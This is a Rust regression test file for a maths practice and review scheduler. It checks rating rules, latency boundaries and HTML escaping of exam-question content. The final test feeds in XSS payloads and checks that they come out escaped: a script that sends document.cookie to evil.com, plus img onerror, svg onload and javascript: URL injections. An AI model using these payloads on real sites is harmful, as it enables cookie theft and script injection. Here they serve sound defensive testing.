// Copyright: Ankitects Pty Ltd and contributors
// License: GNU AGPL, version 3 or later; http://www.gnu.org/licenses/agpl.html

use procedural::core::Domain;
use procedural::diagnostics::{ErrorCategory, ProceduralReviewOutcome};
use procedural::exam::pyq::{PYQSource, PyqMapping};
use procedural::exam::selector::ExamSessionSelector;
use procedural::problems::catalog::MathsCatalog;
use procedural::problems::validator::PercentageSuccessiveValidator;
use procedural::reviewer::template::render_reviewer_html;
use procedural::scheduling::{PracticeSessionObject, Rating, RatingPolicy, StandardRatingPolicy};
use procedural::skills::SkillState;

fn make_outcome(
    is_correct: bool,
    score: f64,
    latency_ms: u64,
    target_latency_ms: u64,
    hints_used: u32,
    attempt_count: u32,
    error_category: Option<ErrorCategory>,
) -> ProceduralReviewOutcome {
    let mut outcome = ProceduralReviewOutcome::new(
        "att-regression-test",
        "schema.test",
        "skill.test",
        "family.test",
        999,
        is_correct,
        score,
        latency_ms,
        target_latency_ms,
        hints_used,
        attempt_count,
        error_category,
    );
    outcome.timestamp = 1000;
    outcome
}

#[test]
fn test_regression_fsrs_rating_scenarios() {
    let policy = StandardRatingPolicy::default();
    let target = 30_000;

    // 1. Final answer incorrect -> Again
    let o_wrong = make_outcome(false, 0.0, 20_000, target, 0, 1, None);
    assert_eq!(policy.derive_rating(&o_wrong, None), Rating::Again);

    // 2. wrong -> correct (attempt_count = 2) -> Hard
    let o_wrong_correct = make_outcome(true, 1.0, 20_000, target, 0, 2, None);
    assert_eq!(policy.derive_rating(&o_wrong_correct, None), Rating::Hard);

    // 3. wrong -> wrong -> correct (attempt_count = 3) -> Again (P0 remediation: must never be Hard/Easy)
    let o_wrong_wrong_correct = make_outcome(true, 1.0, 20_000, target, 0, 3, None);
    assert_eq!(policy.derive_rating(&o_wrong_wrong_correct, None), Rating::Again);

    // 4. wrong -> wrong -> wrong -> correct (attempt_count = 4) -> Again
    let o_four_attempts = make_outcome(true, 1.0, 20_000, target, 0, 4, None);
    assert_eq!(policy.derive_rating(&o_four_attempts, None), Rating::Again);

    // 5. correct + no hints (normal speed) -> Good
    let o_clean_normal = make_outcome(true, 1.0, 28_000, target, 0, 1, None);
    assert_eq!(policy.derive_rating(&o_clean_normal, None), Rating::Good);

    // 6. correct + level-1 hint -> Hard
    let o_hint1 = make_outcome(true, 1.0, 15_000, target, 1, 1, None);
    assert_eq!(policy.derive_rating(&o_hint1, None), Rating::Hard);

    // 7. correct + level-2 hint -> Hard
    let o_hint2 = make_outcome(true, 1.0, 15_000, target, 2, 1, None);
    assert_eq!(policy.derive_rating(&o_hint2, None), Rating::Hard);

    // 8. correct + level-3 hint (heavy hint / bottom-out) -> Again
    let o_hint3 = make_outcome(true, 1.0, 15_000, target, 3, 1, None);
    assert_eq!(policy.derive_rating(&o_hint3, None), Rating::Again);

    // 9. correct with step error (first_error_step was present but student recovered) -> Hard
    let mut o_step_err = make_outcome(true, 1.0, 15_000, target, 0, 1, None);
    o_step_err.first_error_step = Some(0);
    o_step_err.steps_completed = 3;
    o_step_err.steps_correct = 2;
    assert_eq!(policy.derive_rating(&o_step_err, None), Rating::Hard);

    // 10. correct with fatal strategy/concept error -> Again
    let o_strat = make_outcome(true, 1.0, 20_000, target, 0, 1, Some(ErrorCategory::Strategy));
    assert_eq!(policy.derive_rating(&o_strat, None), Rating::Again);

    let o_concept = make_outcome(true, 1.0, 20_000, target, 0, 1, Some(ErrorCategory::Concept));
    assert_eq!(policy.derive_rating(&o_concept, None), Rating::Again);

    // 11. fast correct with strong history -> Easy
    let o_fast = make_outcome(true, 1.0, 18_000, target, 0, 1, None);
    let mut state = SkillState::new("skill.test");
    state.consecutive_successes = 3;
    assert_eq!(policy.derive_rating(&o_fast, Some(&state)), Rating::Easy);

    // 12. slow correct (1.33x target) -> Hard
    let o_slow = make_outcome(true, 1.0, 40_000, target, 0, 1, None);
    assert_eq!(policy.derive_rating(&o_slow, None), Rating::Hard);
}

#[test]
fn test_regression_latency_policy_and_validator_boundaries() {
    let policy = StandardRatingPolicy::default();
    let target_ms = 40_000; // 40s target

    // Test 1: Exactly target (40s / 1.0x)
    let val_target = PercentageSuccessiveValidator::evaluate(
        &serde_json::json!({ "value": 100.0 }),
        &serde_json::json!({}),
        &serde_json::json!("100"),
        40_000,
        target_ms,
    );
    assert!(val_target.is_correct);
    assert_eq!(val_target.error_category, None); // Validator does not inject Time error

    let out_target = make_outcome(true, 1.0, 40_000, target_ms, 0, 1, None);
    assert_eq!(policy.derive_rating(&out_target, None), Rating::Good);

    // Test 2: Just above target (40_500ms = 1.0125x target)
    let val_just_above = PercentageSuccessiveValidator::evaluate(
        &serde_json::json!({ "value": 100.0 }),
        &serde_json::json!({}),
        &serde_json::json!("100"),
        40_500,
        target_ms,
    );
    assert!(val_just_above.is_correct);
    assert_eq!(val_just_above.error_category, None); // Correctness & diagnostics remain clean

    let out_just_above = make_outcome(true, 1.0, 40_500, target_ms, 0, 1, None);
    assert_eq!(policy.derive_rating(&out_just_above, None), Rating::Good); // Still within 1.25x

    // Test 3: 1.2x target (48_000ms) -> Good
    let out_1_2x = make_outcome(true, 1.0, 48_000, target_ms, 0, 1, None);
    assert_eq!(policy.derive_rating(&out_1_2x, None), Rating::Good);

    // Test 4: 1.25x target exact boundary (50_000ms) -> Good (not strictly greater than threshold)
    let out_1_25x = make_outcome(true, 1.0, 50_000, target_ms, 0, 1, None);
    assert_eq!(policy.derive_rating(&out_1_25x, None), Rating::Good);

    // Test 5: 1.5x target (60_000ms) -> Hard
    let val_slow = PercentageSuccessiveValidator::evaluate(
        &serde_json::json!({ "value": 100.0 }),
        &serde_json::json!({}),
        &serde_json::json!("100"),
        60_000,
        target_ms,
    );
    assert!(val_slow.is_correct);
    assert_eq!(val_slow.error_category, None); // Validator stays focused on correctness

    let out_1_5x = make_outcome(true, 1.0, 60_000, target_ms, 0, 1, None);
    assert_eq!(policy.derive_rating(&out_1_5x, None), Rating::Hard);
}

#[test]
fn test_regression_pyq_and_html_xss_escaping() {
    let schema = MathsCatalog::linear_equations_schema();

    // Hostile PYQ content
    let pyq = PYQSource::new(
        "pyq.malicious.001",
        "RRB ALP",
        2024,
        Domain::Mathematics,
        "<script>fetch('http://evil.com/leak?q=' + document.cookie)</script> Solve $2x = 10$",
        serde_json::json!({ "value": 5.0, "solution": "Step: divide by 2 <svg/onload=alert(1)>" }),
        "<a href=\"javascript:evil()\">Source 2024</a>",
    )
    .with_options(vec![
        "<img src=x onerror=alert('optA')> 5".to_string(),
        "<iframe src=\"javascript:alert('optB')\"> 10".to_string(),
    ]);

    let mapping = PyqMapping::new(
        &pyq.id,
        Domain::Mathematics,
        "algebra.linear_equations",
        &schema.id,
        &schema.problem_family_id,
        2,
        45_000,
    );

    let instance = ExamSessionSelector::create_instance_from_pyq(&pyq, &mapping);
    let session = PracticeSessionObject::new(schema, instance, Some(1), None);
    let html = render_reviewer_html(&session);

    // 1. Raw malicious tags must NOT be present
    assert!(!html.contains("<script>fetch("));
    assert!(!html.contains("<img src=x onerror="));
    assert!(!html.contains("<iframe src="));
    assert!(!html.contains("<svg/onload="));

    // 2. Safe HTML encoded entities must be present
    assert!(html.contains("&lt;script&gt;fetch("));
    assert!(html.contains("&lt;img src=x onerror=alert(&#39;optA&#39;)&gt;"));
    assert!(html.contains("&lt;iframe src=&quot;javascript:alert(&#39;optB&#39;)&quot;&gt;"));
    assert!(html.contains("&lt;svg/onload=alert(1)&gt;"));

    // 3. Mathematical notation remains intact for MathJax rendering
    assert!(html.contains("Solve $2x = 10$"));
}